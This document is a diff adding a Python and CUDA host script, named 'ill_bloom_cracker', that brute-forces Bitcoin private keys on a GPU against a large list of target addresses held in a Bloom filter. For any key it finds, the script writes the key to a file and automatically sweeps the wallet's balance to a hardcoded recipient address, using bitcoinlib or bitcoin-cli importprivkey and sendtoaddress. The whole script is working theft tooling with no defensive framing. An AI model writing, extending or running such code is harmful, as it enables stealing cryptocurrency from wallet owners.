@@ -1,0 +1,317 @@
+#!/usr/bin/env python3
+
+import os
+os.environ["CUDA_PATH"] = r"C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v12.9"
+import sys
+import csv
+import time
+import numpy as np
+import base58
+import multiprocessing as mp
+import threading
+import subprocess
+import pycuda.driver as cuda
+import pycuda.autoinit
+from pycuda.compiler import SourceModule
+
+TARGET_ADDRESS = "bc1qv9h8pwqvugpdlrfg436wjh06ncexa2vhrxflwu"  
+
+# Host code
+
+def decode_chunk(chunk_lines):
+    results = []
+    for line in chunk_lines:
+        line = line.strip()
+        if not line:
+            continue
+        parts = line.split(b'\t')
+        if not parts:
+            continue
+        addr = parts[0].strip()
+        try:
+            decoded = base58.b58decode(addr)
+            h160 = decoded[1:-4]
+            if len(h160) == 20:
+                results.append(h160)
+        except:
+            pass
+    return results
+
+def chunked_lines(file_path, chunk_size=100_000):
+    with open(file_path, 'rb') as f:
+        chunk = []
+        for line in f:
+            chunk.append(line)
+            if len(chunk) >= chunk_size:
+                yield chunk
+                chunk = []
+        if chunk:
+            yield chunk
+
+
+# Bloom filter
+
+def build_tables(targets):
+    bloom_size_bits = 1 << 30  # 1 Gbit
+    bloom_words = bloom_size_bits >> 6
+    bloom_bits = bytearray(bloom_words * 8)
+    bloom_words = len(bloom_bits) // 8   # number of 64‑bit words in the Bloom filter
+
+    def splitmix64(x, seed):
+        x = (x + seed) & 0xFFFFFFFFFFFFFFFF
+        x = (x ^ (x >> 30)) * 0xbf58476d1ce4e5b9 & 0xFFFFFFFFFFFFFFFF
+        x = (x ^ (x >> 27)) * 0x94d049bb133111eb & 0xFFFFFFFFFFFFFFFF
+        return x ^ (x >> 31)
+
+    def h160_to_key(h160):
+        key = 0
+        for b in h160:
+            key = (key << 8) | b
+        return key
+
+    # Bloom
+    for h160 in targets:
+        key = h160_to_key(h160)
+        h1 = splitmix64(key, 0x9e3779b97f4a7c15) % bloom_size_bits
+        h2 = splitmix64(key, 0xbf58476d1ce4e5b9) % bloom_size_bits
+        for h in (h1, h2):
+            word = h >> 6
+            bit = 1 << (h & 63)
+            idx = word * 8
+            val = int.from_bytes(bloom_bits[idx:idx+8], 'little')
+            val |= bit
+            bloom_bits[idx:idx+8] = val.to_bytes(8, 'little')
+
+    # Hash table (load factor 0.5)
+    table_size = 1
+    while table_size < len(targets) * 2:
+        table_size <<= 1
+    hash_table = bytearray(table_size * 20)
+
+    def insert(h160):
+        key = h160_to_key(h160)
+        pos = (key ^ 0x9e3779b97f4a7c15) & (table_size - 1)
+        for _ in range(32):
+            slot = pos * 20
+            if hash_table[slot:slot+20] == b'\x00'*20:
+                hash_table[slot:slot+20] = bytes(h160)
+                return True
+            pos = (pos + 1) & (table_size - 1)
+        return False
+
+    for h160 in targets:
+        insert(h160)
+
+    return bloom_bits, hash_table, table_size
+
+
+# Sweep function
+
+import hashlib
+import base58
+
+def raw_to_wif(raw_hex, compressed=True):
+    """Convert raw private key hex to WIF (compressed by default)."""
+    priv_key = bytes.fromhex(raw_hex)
+    # Add prefix for mainnet (0x80)
+    extended = b'\x80' + priv_key
+    if compressed:
+        extended += b'\x01'   # compressed flag
+    # Double SHA-256 checksum
+    checksum = hashlib.sha256(hashlib.sha256(extended).digest()).digest()[:4]
+    return base58.b58encode(extended + checksum).decode()
+
+def sweep_wallet(privkey_hex, target_address):
+    try:
+        wif = raw_to_wif(privkey_hex)
+        from bitcoinlib.wallets import Wallet
+        from bitcoinlib.transactions import Transaction
+        w = Wallet.import_private_key(wif, network='bitcoin')
+        balance = w.balance()
+        if balance == 0:
+            print(f"[!] No balance for {privkey_hex[:10]}...")
+            return
+        fee = 3000
+        t = Transaction(network='bitcoin')
+        t.add_input(w.utxos())
+        t.add_output(target_address, balance - fee)
+        t.fee = fee
+        t.sign()
+        txid = t.send()
+        print(f"[*] Swept {balance/1e8:.8f} BTC from {privkey_hex[:10]}... to {target_address} (txid: {txid})")
+    except ImportError:
+        import subprocess
+        # Import and send using bitcoin-cli
+        try:
+            subprocess.run(["bitcoin-cli", "importprivkey", wif, "", "false"], check=True, capture_output=True)
+            balance_sats = int(float(subprocess.check_output(["bitcoin-cli", "getbalance", "*", "0"]).decode().strip()) * 1e8)
+            if balance_sats == 0:
+                print(f"[!] No balance for {privkey_hex[:10]}...")
+                return
+            subprocess.run(["bitcoin-cli", "sendtoaddress", target_address, str(balance_sats/1e8)], check=True)
+            print(f"[*] Swept {balance_sats/1e8:.8f} BTC from {privkey_hex[:10]}...")
+        except subprocess.CalledProcessError as e:
+            print(f"[!] Bitcoin-cli error: {e}")
+    except Exception as e:
+        print(f"[!] Sweep error for {privkey_hex[:10]}: {e}")
+
+# Main
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: python ill_bloom_cracker.py addresses.tsv")
+        sys.exit(1)
+
+        # ---- Parallel loading ----
+    print(f"CUDA driver version: {cuda.get_version()}")
+    print("[*] Loading and decoding addresses in parallel...")
+    CHUNK_SIZE = 100_000
+    NUM_WORKERS = mp.cpu_count()
+
+    with mp.Pool(processes=NUM_WORKERS) as pool:
+        results = pool.imap_unordered(decode_chunk, chunked_lines(sys.argv[1], CHUNK_SIZE))
+        targets = []
+        for res in results:
+            targets.extend(res)
+
+    print(f"[*] Decoded {len(targets):,} valid addresses.")
+
+
+    
+
+    # Build tables 
+    
+    print("[*] Building Bloom filter and hash table...")
+    bloom_bits, hash_table, table_size = build_tables(targets)
+    bloom_words = len(bloom_bits) // 8
+    print(f"[*] Bloom filter: {len(bloom_bits)//(1024*1024)} MB, Hash table: {len(hash_table)//(1024*1024)} MB")
+
+    print("[*] Compiling kernel from debug.cu (this may take 2–5 minutes)...")
+    with open("debug.cu", "r") as f:
+        src = f.read()
+
+    mod = SourceModule(
+        src,
+        options=[
+            '-std=c++14',
+            '--use_fast_math',
+            '--maxrregcount=48',
+            '-arch=sm_75',   # safe architecture – loads fast on any driver
+            '-ccbin', r'C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64'
+        ],
+        keep=True  # optional, prints temp files for debugging
+    )
+    
+    cracker = mod.get_function("ill_bloom_cracker")
+    print("[*] Kernel compiled and loaded successfully.")
+    print("[*] Kernel loaded. Allocating device memory...")
+
+    BATCH = 5_000_000  # increased from 1M to utilise GPU memory (6 GB VRAM)
+    MAX_ATTEMPTS = 1 << 47
+    progress_interval = 1 * BATCH
+    
+
+# Allocate memory 
+    d_global_seed = cuda.mem_alloc(8)
+    cuda.memset_d8(int(d_global_seed), 0, 8)
+    print("[*] d_global_seed allocated and zeroed.")
+
+    d_bloom = cuda.mem_alloc(len(bloom_bits))
+    cuda.memcpy_htod(d_bloom, bloom_bits)
+    print("[*] Bloom filter copied to device.")
+
+    d_hash_table = cuda.mem_alloc(len(hash_table))
+    cuda.memcpy_htod(d_hash_table, hash_table)
+    print("[*] Hash table copied to device.")
+
+
+    
+
+    d_priv_keys = cuda.mem_alloc(BATCH * 32)
+    d_found_idx = cuda.mem_alloc(BATCH * 4)
+    d_found_count = cuda.mem_alloc(4)
+    print("[*] Output buffers allocated.")
+
+    found_count_host = cuda.pagelocked_empty(1, dtype=np.uint32)
+    found_idx_host = cuda.pagelocked_empty(BATCH, dtype=np.uint32)
+    print("[*] Host buffers created.")
+
+    streams = [cuda.Stream() for _ in range(8)]
+    print("[*] Streams created. Entering main loop...")
+    
+    
+    stream_idx = 0
+    total_attempts = 0
+    
+    start = time.time()
+
+    try:
+        while total_attempts < MAX_ATTEMPTS:
+            stream = streams[stream_idx % len(streams)]
+            stream_idx += 1
+
+            block = (256, 1, 1)
+            grid = ((BATCH + block[0] - 1) // block[0], 1, 1)
+
+            print("[*] Clearing found_count...", flush=True)
+            cuda.memset_d8(int(d_found_count), 0, 4)
+
+            print("[*] Launching kernel... (this may take a while if JIT compiling)", flush=True)
+            # Launch kernel
+            try:
+                cracker(d_global_seed, d_bloom, np.uint32(bloom_words),
+                        d_hash_table, np.uint32(table_size),
+                        d_found_idx, d_found_count, d_priv_keys,
+                        block=block, grid=grid, stream=stream)
+
+                print("[*] Kernel launched. Copying found_count back...", flush=True)
+                cuda.memcpy_dtoh_async(found_count_host, d_found_count, stream)
+                print("[*] Synchronizing stream...", flush=True)
+                stream.synchronize()
+                print("[*] Stream synchronized.", flush=True)
+
+
+            except cuda.Error as e:
+                print(f"Kernel launch error: {e}")
+                
+
+            cnt = found_count_host[0]
+            if cnt > 0:
+                cuda.memcpy_dtoh_async(found_idx_host, d_found_idx, cnt * 4, stream)
+                stream.synchronize()
+                indices = found_idx_host[:cnt]
+                for idx in indices:
+                    priv_buf = bytearray(32)
+                    cuda.memcpy_dtoh(priv_buf, d_priv_keys + idx * 32, 32)
+                    priv_hex = priv_buf.hex()
+
+                    with open("found_wallets.txt", "a") as f:
+                        f.write(f"{priv_hex}\n")
+                    print(f"[*] Saved private key {priv_hex[:10]}... to found_wallets.txt")
+
+                    threading.Thread(target=sweep_wallet, args=(priv_hex, TARGET_ADDRESS)).start()
+                print(f"[+] Found {cnt} wallets, sweeping initiated.")
+
+            total_attempts += BATCH
+            if total_attempts % progress_interval == 0:
+                elapsed = time.time() - start
+                rate = total_attempts / elapsed
+                remaining = (MAX_ATTEMPTS - total_attempts) / rate
+                print(f"\n[*] Progress: {total_attempts/MAX_ATTEMPTS*100:.2f}%  ({total_attempts:,} / {MAX_ATTEMPTS:,})")
+                print(f"    Rate: {rate:,.0f} seeds/s, ETA: {remaining/3600:.1f}h")
+                if cnt > 0:
+                    print(f"    [+] Found {cnt} wallets in this batch!")
+
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted.")
+    finally:
+        d_global_seed.free()
+        d_bloom.free()
+        d_hash_table.free()
+        d_priv_keys.free()
+        d_found_idx.free()
+        d_found_count.free()
+        print("[*] Shutdown complete.")
+
+if __name__ == "__main__":
+    main()
